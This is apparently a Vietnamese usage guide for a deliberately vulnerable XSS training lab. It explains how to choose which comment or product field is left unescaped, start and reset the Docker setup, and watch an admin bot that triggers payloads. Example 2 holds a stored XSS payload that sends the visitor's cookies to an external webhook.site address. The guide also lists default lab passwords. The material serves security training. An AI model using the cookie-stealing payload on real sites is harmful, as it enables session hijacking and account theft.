# Hướng dẫn sử dụng XSS Lab 02

## 📋 Mục lục
1. [Cài đặt và khởi động](#cài-đặt-và-khởi-động)
2. [Biến môi trường ENV](#biến-môi-trường-env)
3. [Các câu lệnh cơ bản](#các-câu-lệnh-cơ-bản)
4. [Các script helper](#các-script-helper)
5. [Ví dụ sử dụng](#ví-dụ-sử-dụng)

---

## 🚀 Cài đặt và khởi động

### Khởi động lab (mặc định - XSS ở field `comment`)
```bash
cd /home/ubuntu/Desktop/xss_02
docker compose up -d --build
```

### Truy cập ứng dụng
- **Web application**: http://localhost:8081
- **MySQL**: localhost:3307

### Tài khoản mặc định
- **Admin**: `admin` / `admin123`
- **User 1**: `user1` / `user123`
- **User 2**: `user2` / `user123`

---

## 🔧 Biến môi trường ENV

### Cách hoạt động
Biến môi trường `ENV` quyết định **field nào sẽ bị lỗ hổng XSS**. Chỉ field được chỉ định mới bị XSS, các field khác đều được HTML encode (an toàn).

### Các giá trị ENV hợp lệ

#### Field cụ thể (khuyến nghị):
| ENV | Field bị XSS | Mô tả |
|-----|--------------|-------|
| `display_name` | Tên hiển thị trong bình luận | Tên người dùng hiển thị khi comment |
| `display_email` | Email hiển thị trong bình luận | Email người dùng hiển thị khi comment |
| `title` | Tiêu đề bình luận | Tiêu đề của bình luận |
| `comment` | Nội dung bình luận | **Mặc định** - Nội dung chính của bình luận |
| `rating` | Đánh giá (1-5 sao) | Số sao đánh giá sản phẩm |
| `name` | Tên user (từ bảng users) | Tên thật của user |
| `username` | Username | Tên đăng nhập |
| `email` | Email user (từ bảng users) | Email đăng ký của user |
| `product_name` | Tên sản phẩm | Tên sản phẩm |
| `description` | Mô tả sản phẩm | Mô tả chi tiết sản phẩm |

#### Nhóm field (backward compatibility):
| ENV | Fields bị XSS | Mô tả |
|-----|---------------|-------|
| `users` | name, username, email, display_name, display_email | Tất cả field liên quan đến user |
| `products` | product_name, description | Tất cả field liên quan đến sản phẩm |
| `comments` | title, comment | Tất cả field liên quan đến bình luận |

### Lưu ý về alias
- `ENV=email` → match cả `email` và `display_email`
- `ENV=display_email` → match cả `email` và `display_email`
- `ENV=name` → match cả `name` và `display_name`
- `ENV=display_name` → match cả `name` và `display_name`

---

## 💻 Các câu lệnh cơ bản

### 1. Khởi động với ENV cụ thể

**Cách 1: Truyền ENV trực tiếp**
```bash
# XSS ở field display_name
ENV=display_name docker compose up -d --build

# XSS ở field title
ENV=title docker compose up -d --build

# XSS ở field email (sẽ match cả email và display_email)
ENV=email docker compose up -d --build

# XSS ở nhóm users
ENV=users docker compose up -d --build
```

**Cách 2: Export ENV trước**
```bash
# Export biến môi trường
export ENV=display_name

# Khởi động
docker compose up -d --build
```

**Cách 3: Sử dụng script helper (khuyến nghị)**
```bash
./scripts/start_lab.sh display_name
./scripts/start_lab.sh title
./scripts/start_lab.sh email
```

### 2. Dừng lab
```bash
docker compose down
```

### 3. Khởi động lại (giữ nguyên ENV)
```bash
docker compose restart
```

### 4. Khởi động lại với ENV mới
```bash
# Dừng
docker compose down

# Khởi động với ENV mới
ENV=title docker compose up -d --build
```

### 5. Rebuild hoàn toàn
```bash
docker compose down
docker compose up -d --build
```

### 6. Xem log
```bash
# Log admin monitor (cron + Puppeteer)
docker exec xss_02_web tail -f /var/log/admin_monitor.log

# Log 60 dòng cuối
docker exec xss_02_web tail -60 /var/log/admin_monitor.log

# Log container web
docker compose logs -f web

# Log container db
docker compose logs -f db
```

### 7. Kiểm tra trạng thái
```bash
# Xem trạng thái containers
docker compose ps

# Xem biến môi trường trong container
docker compose exec web printenv XSS_VULN_FIELD
```

### 8. Reset database
```bash
# Restart container db (database sẽ tự động reset)
docker compose restart db

# Hoặc restart toàn bộ
docker compose down
docker compose up -d
```

### 9. Chạy migration (nếu cần)
```bash
# Migration thêm cột
docker compose exec db mysql -uroot -proot123 xss_02_lab < database/migration_add_name.sql

# Migration tăng độ dài cột
docker compose exec db mysql -uroot -proot123 xss_02_lab < database/migration_extend_columns.sql
```

### 10. Truy cập MySQL
```bash
# Vào MySQL shell
docker compose exec db mysql -uroot -proot123 xss_02_lab

# Hoặc từ bên ngoài
mysql -h localhost -P 3307 -uroot -proot123 xss_02_lab
```

---

## 🛠️ Các script helper

### 1. `scripts/start_lab.sh` - Khởi động lab với field XSS
```bash
# Sử dụng
./scripts/start_lab.sh [field_name]

# Ví dụ
./scripts/start_lab.sh display_name
./scripts/start_lab.sh title
./scripts/start_lab.sh email

# Nếu không truyền tham số, sẽ dùng ENV hoặc mặc định là 'comment'
./scripts/start_lab.sh
```

**Các field hợp lệ:**
- `display_name`, `display_email`, `title`, `comment`, `rating`
- `name`, `username`, `email`, `product_name`, `description`
- `users`, `products`, `comments` (nhóm)

### 2. `scripts/reset_lab.sh` - Reset lab về trạng thái ban đầu
```bash
./scripts/reset_lab.sh
```

Script này sẽ:
- Dừng và xóa containers
- Xóa volumes (nếu có)
- Hỏi có muốn xóa image cũ không
- Khởi động lại lab

---

## 📝 Ví dụ sử dụng

### Ví dụ 1: Test XSS ở field `display_name`

```bash
# 1. Khởi động lab với ENV=display_name
ENV=display_name docker compose up -d --build

# Hoặc dùng script
./scripts/start_lab.sh display_name

# 2. Truy cập http://localhost:8081
# 3. Đăng nhập với user1/user123
# 4. Vào trang sản phẩm bất kỳ
# 5. Điền form bình luận:
#    - Tên hiển thị: <script>alert('XSS')</script>
#    - Email: user1@example.com
#    - Tiêu đề: Test
#    - Nội dung: Bình thường
# 6. Submit
# 7. Chờ 3-4 phút, admin sẽ tự động truy cập và kích hoạt XSS
```

### Ví dụ 2: Test XSS ở field `title`

```bash
# Khởi động
ENV=title docker compose up -d --build

# Trong form bình luận:
# - Tên hiển thị: User1 (an toàn)
# - Email: user1@example.com (an toàn)
# - Tiêu đề: <script>document.location='https://webhook.site/xxx/?cookie='+document.cookie</script>
# - Nội dung: Bình thường (an toàn)
```

### Ví dụ 3: Test XSS ở field `email`

```bash
# Khởi động
ENV=email docker compose up -d --build

# Lưu ý: ENV=email sẽ match cả 'email' và 'display_email'
# Nên cả 2 field đều bị XSS
```

### Ví dụ 4: Kiểm tra field nào đang bị XSS

```bash
# Xem biến môi trường trong container
docker compose exec web printenv XSS_VULN_FIELD

# Hoặc kiểm tra trong PHP
docker compose exec web php -r "echo getenv('XSS_VULN_FIELD');"
```

### Ví dụ 5: Thay đổi field XSS mà không rebuild

```bash
# Dừng
docker compose down

# Khởi động với ENV mới
ENV=title docker compose up -d

# Lưu ý: Nếu thay đổi ENV, nên rebuild để đảm bảo
ENV=title docker compose up -d --build
```

### Ví dụ 6: Xem log admin monitor

```bash
# Xem log real-time
docker exec xss_02_web tail -f /var/log/admin_monitor.log

# Xem 100 dòng cuối
docker exec xss_02_web tail -100 /var/log/admin_monitor.log

# Tìm XSS thành công
docker exec xss_02_web grep "XSS THÀNH CÔNG" /var/log/admin_monitor.log
```

---

## 🔍 Troubleshooting

### Lỗi "Column not found"
```bash
# Chạy migration
docker compose exec db mysql -uroot -proot123 xss_02_lab < database/migration_add_name.sql
```

### Lỗi "Data too long for column"
```bash
# Chạy migration tăng độ dài cột
docker compose exec db mysql -uroot -proot123 xss_02_lab < database/migration_extend_columns.sql
```

### Container không khởi động
```bash
# Xem log chi tiết
docker compose logs web
docker compose logs db

# Rebuild hoàn toàn
docker compose down
docker compose up -d --build
```

### Database không reset
```bash
# Restart container db
docker compose restart db

# Hoặc restart toàn bộ
docker compose down
docker compose up -d
```

### ENV không áp dụng
```bash
# Kiểm tra ENV trong container
docker compose exec web printenv XSS_VULN_FIELD

# Nếu sai, restart với ENV đúng
docker compose down
ENV=display_name docker compose up -d --build
```

---

## 📌 Tóm tắt nhanh

### Khởi động với field XSS cụ thể:
```bash
ENV=display_name docker compose up -d --build
ENV=title docker compose up -d --build
ENV=email docker compose up -d --build
```

### Hoặc dùng script:
```bash
./scripts/start_lab.sh display_name
./scripts/start_lab.sh title
```

### Xem log:
```bash
docker exec xss_02_web tail -f /var/log/admin_monitor.log
```

### Dừng:
```bash
docker compose down
```

---

## 📚 Tham khảo thêm

- Xem `README.md` để biết thêm chi tiết về cấu trúc và cách hoạt động
- Xem `docker-compose.yml` để biết cấu hình chi tiết
- Xem `src/config/xss_helper.php` để hiểu logic kiểm tra XSS

